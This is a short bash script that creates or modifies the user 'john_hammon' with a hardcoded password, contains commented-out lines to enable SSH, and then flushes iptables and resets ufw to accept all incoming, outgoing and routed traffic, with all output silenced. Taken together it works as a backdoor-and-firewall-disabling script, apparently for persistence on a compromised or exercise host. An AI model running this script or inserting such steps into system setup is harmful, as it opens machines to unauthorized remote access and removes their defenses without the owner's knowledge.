#!/bin/bash

USERNAME="john_hammon"
NEW_PASSWORD="welcomeToJurrasicPark00!"

if ! id "$USERNAME" &>/dev/null; then
    sudo useradd -m -s /bin/bash "$USERNAME"
else
    sudo usermod -s /bin/bash "$USERNAME"
fi

sudo echo "$USERNAME:$NEW_PASSWORD" | chpasswd

# sudo systemctl unmask ssh >/dev/null 2>&1
# sudo systemctl enable ssh >/dev/null 2>&1
# sudo systemctl restart ssh >/dev/null 2>&1

sudo iptables -F >/dev/null 2>&1
sudo iptables -X >/dev/null 2>&1
sudo iptables -P INPUT ACCEPT >/dev/null 2>&1
sudo iptables -P FORWARD ACCEPT >/dev/null 2>&1
sudo iptables -P OUTPUT ACCEPT >/dev/null 2>&1


sudo ufw --force reset >/dev/null 2>&1
sudo ufw default allow incoming >/dev/null 2>&1
sudo ufw default allow outgoing >/dev/null 2>&1
sudo ufw default allow routed >/dev/null 2>&1
sudo ufw --force enable >/dev/null 2>&1

exit 0
